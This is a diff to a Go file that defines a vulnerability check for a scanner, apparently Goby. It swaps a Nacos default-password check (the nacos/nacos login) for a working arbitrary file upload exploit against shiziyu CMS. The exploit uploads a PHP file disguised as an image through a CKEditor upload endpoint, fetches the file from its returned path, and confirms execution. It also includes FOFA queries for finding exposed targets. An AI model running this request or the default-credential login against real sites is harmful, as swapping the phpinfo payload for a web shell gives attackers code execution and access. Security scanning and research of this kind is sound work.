@@ -6,14 +6,14 @@ import (
 
 func init() {
 	expJson := `{
-  "Name": "Alibaba Nacos 默认密码",
+  "Name": "狮子鱼CMS image_upload.php 任意文件上传",
   "Description": "",
-  "Product": "Nacos",
+  "Product": "",
   "Homepage": "",
   "DisclosureDate": null,
   "Author": "清晨",
-  "FofaQuery": "title=\"Nacos\"",
-  "GobyQuery": "title=\"Nacos\"",
+  "FofaQuery": "\"/seller.php?s=/Public/login\"",
+  "GobyQuery": "\"/seller.php?s=/Public/login\"",
   "Level": "3",
   "Impact": "",
   "Recommendation": "",
@@ -30,16 +30,39 @@ func init() {
     {
       "Request": {
         "method": "POST",
-        "uri": "/nacos/v1/auth/users/login",
+        "uri": "/Common/ckeditor/plugins/multiimg/dialogs/image_upload.php",
         "follow_redirect": true,
         "header": {
-          "Accept": "application/json, text/plain, */*",
-          "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
-          "Accept-Encoding": "gzip, deflate",
-          "Content-Type": "application/x-www-form-urlencoded"
+          "Content-Type": "multipart/form-data;boundary=----WebKitFormBoundary8UaANmWAgM4BqBSs"
         },
         "data_type": "text",
-        "data": "username=nacos&password=nacos"
+        "data": "------WebKitFormBoundary8UaANmWAgM4BqBSs\nContent-Disposition: form-data; name=\"files\"; filename=\"test.php\"\nContent-Type: image/gif\n\n<?php phpinfo();?>\n------WebKitFormBoundary8UaANmWAgM4BqBSs—"
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": [
+        "path|lastbody|regex|\"imgurl\":\"(.*?)\""
+      ]
+    },
+    {
+      "Request": {
+        "method": "GET",
+        "uri": "/Common/{{{path}}}",
+        "follow_redirect": true,
+        "header": {},
+        "data_type": "text",
+        "data": ""
       },
       "ResponseTest": {
         "type": "group",
@@ -56,7 +79,7 @@ func init() {
             "type": "item",
             "variable": "$body",
             "operation": "contains",
-            "value": "accessToken",
+            "value": "PHP Version",
             "bz": ""
           }
         ]
@@ -112,8 +135,8 @@ func init() {
   "CVSSScore": "",
   "Translation": {
     "CN": {
-      "Name": "Alibaba Nacos 默认密码",
-      "Product": "Nacos",
+      "Name": "狮子鱼CMS image_upload.php 任意文件上传",
+      "Product": "",
       "Description": "",
       "Recommendation": "",
       "Impact": "",
@@ -121,7 +144,7 @@ func init() {
       "Tags": []
     },
     "EN": {
-      "Name": "Alibaba Nacos Default password",
+      "Name": "shiziyu CMS image_upload.php file upload",
       "Product": "",
       "Description": "",
       "Recommendation": "",
